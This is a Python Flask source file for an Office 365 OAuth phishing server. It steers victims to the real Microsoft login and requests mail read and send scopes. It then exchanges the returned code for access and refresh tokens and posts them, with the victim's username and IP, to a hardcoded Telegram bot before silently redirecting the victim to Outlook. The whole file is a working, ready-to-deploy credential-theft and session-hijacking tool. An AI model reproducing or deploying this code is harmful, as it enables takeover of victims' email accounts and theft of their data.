from flask import Flask, request, redirect
import requests
import logging
import os
import urllib.parse

app = Flask(__name__)

# ==============================================================================
# CONFIGURATION
# ==============================================================================
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

# Microsoft OAuth2 Configuration
# Using a common public client ID that allows for this type of flow
MS_CLIENT_ID = "00000002-0000-0ff1-ce00-000000000000" 
MS_REDIRECT_URI = "https://myappsignin.onrender.com/callback"
MS_SCOPE = "openid profile email offline_access Mail.Read Mail.Send"
MS_STATE = "o365_phish_state_123"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ==============================================================================
# HELPER FUNCTIONS
# ==============================================================================

def send_to_telegram(data):
    """
    Sends the captured session data to your Telegram bot.
    """
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    # Build the message. We use HTML for formatting.
    # We escape special characters in tokens to prevent HTML parsing errors
    safe_access = data.get('access_token', 'N/A').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
    safe_refresh = data.get('refresh_token', 'N/A').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
    
    text = f"""
🛡️ <b>O365 Session Hijacked</b>

👤 <b>User:</b> {data.get('username', 'N/A')}
🌐 <b>Source IP:</b> {data.get('ip', 'N/A')}

🔑 <b>Access Token:</b>
<code>{safe_access}</code>

🔄 <b>Refresh Token:</b>
<code>{safe_refresh}</code>
"""
    
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    
    try:
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            logger.info("Successfully sent tokens to Telegram")
        else:
            logger.error(f"Telegram API error: {response.text}")
    except Exception as e:
        logger.error(f"Failed to send to Telegram: {e}")

def exchange_code_for_tokens(auth_code):
    """
    Exchanges the authorization code for Access and Refresh tokens.
    """
    url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    
    data = {
        "client_id": MS_CLIENT_ID,
        "grant_type": "authorization_code",
        "code": auth_code,
        "redirect_uri": MS_REDIRECT_URI,
        "scope": MS_SCOPE
    }
    
    try:
        response = requests.post(url, data=data, timeout=10)
        if response.status_code == 200:
            return response.json()
        else:
            logger.error(f"Token exchange failed: {response.status_code} {response.text}")
            return {"error": response.text}
    except Exception as e:
        logger.error(f"Token exchange exception: {e}")
        return {"error": str(e)}

# ==============================================================================
# ROUTES
# ==============================================================================

@app.route("/", methods=["GET"])
def index():
    """
    Entry point. Redirects the user to the real Microsoft Login page.
    """
    params = {
        "client_id": MS_CLIENT_ID,
        "response_type": "code",
        "scope": MS_SCOPE,
        "redirect_uri": MS_REDIRECT_URI,
        "state": MS_STATE,
        "prompt": "select_account" # Force the user to pick an account
    }
    
    ms_login_url = f"https://login.microsoftonline.com/common/oauth2/authorize?{urllib.parse.urlencode(params)}"
    logger.info(f"Redirecting user to MS Login: {ms_login_url}")
    return redirect(ms_login_url)

@app.route("/callback", methods=["GET"])
def callback():
    """
    Handles the redirect from Microsoft.
    1. Captures the auth code.
    2. Exchanges it for tokens.
    3. Sends tokens to Telegram.
    4. Redirects user to Outlook.
    """
    auth_code = request.args.get('code', 'N/A')
    state = request.args.get('state', 'N/A')
    error = request.args.get('error', 'None')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if error:
        logger.warning(f"MS Login returned error: {error}")
        send_to_telegram({
            "username": "Login Error",
            "ip": ip,
            "access_token": error,
            "refresh_token": "N/A"
        })
        return redirect("https://outlook.office365.com/")

    if auth_code == 'N/A':
        logger.warning("No auth code received in callback")
        send_to_telegram({
            "username": "No Code Received",
            "ip": ip,
            "access_token": "Check Logs",
            "refresh_token": "N/A"
        })
        return redirect("https://outlook.office365.com/")

    logger.info(f"Received Auth Code. Exchanging for tokens...")
    
    # Perform the exchange on the server
    tokens = exchange_code_for_tokens(auth_code)
    
    # Extract tokens
    access_token = tokens.get("access_token", "Exchange Failed")
    refresh_token = tokens.get("refresh_token", "N/A")
    
    # Try to decode the ID token to get the username
    # The ID token is a JWT, we can split it and decode the payload
    username = "Unknown"
    id_token = tokens.get("id_token", "")
    if id_token:
        try:
            import base64
            # JWT is header.payload.signature
            payload_part = id_token.split('.')[1]
            # Add padding if necessary
            padding = 4 - len(payload_part) % 4
            if padding != 4:
                payload_part += '=' * padding
            decoded = base64.urlsafe_b64decode(payload_part)
            import json
            user_info = json.loads(decoded)
            username = user_info.get("preferred_username", user_info.get("email", "Unknown"))
        except Exception as e:
            logger.error(f"Failed to decode ID token: {e}")

    logger.info(f"Token exchange successful for user: {username}")
    
    # Send to Telegram
    send_to_telegram({
        "username": username,
        "ip": ip,
        "access_token": access_token,
        "refresh_token": refresh_token
    })
    
    # Redirect the user to the real Outlook so they don't suspect anything
    return redirect("https://outlook.office365.com/")

@app.route("/health")
def health():
    """
    Health check endpoint for monitoring.
    """
    return "O365 OAuth2 Interceptor is Operational"

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(host="0.0.0.0", port=port)
